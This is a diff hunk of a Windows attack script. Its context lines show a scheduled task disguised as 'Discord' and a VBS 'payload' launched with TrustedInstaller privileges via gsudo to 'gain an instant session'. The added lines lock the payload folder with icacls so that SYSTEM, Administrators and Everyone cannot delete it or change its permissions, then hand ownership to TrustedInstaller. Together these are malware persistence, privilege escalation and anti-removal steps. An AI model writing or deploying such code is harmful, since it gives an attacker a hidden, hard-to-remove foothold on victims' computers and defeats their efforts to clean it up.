@@ -29,3 +29,6 @@ Register-ScheduledTask -TaskName 'Discord' -Trigger (New-ScheduledTaskTrigger -A
 # 4. Trigger the payload script immediately with highest privileges to gain an instant session without waiting for reboot
 # Note: Ensure C:\uptm\auto_host.vbs has been pre-staged or downloaded prior to this step
 gsudo -s --ti wscript.exe "C:\uptm\auto_host.vbs"
+
+gsudo -s --ti icacls "C:\uptm" /deny "NT AUTHORITY\SYSTEM:(OI)(CI)(D,DE,WDAC,WO)" "Administrators:(OI)(CI)(D,DE,WDAC,WO)" "Everyone:(OI)(CI)(D,DE,WDAC,WO)"
+gsudo -s --ti icacls "C:\uptm" /setowner "NT SERVICE\TrustedInstaller" /T /C
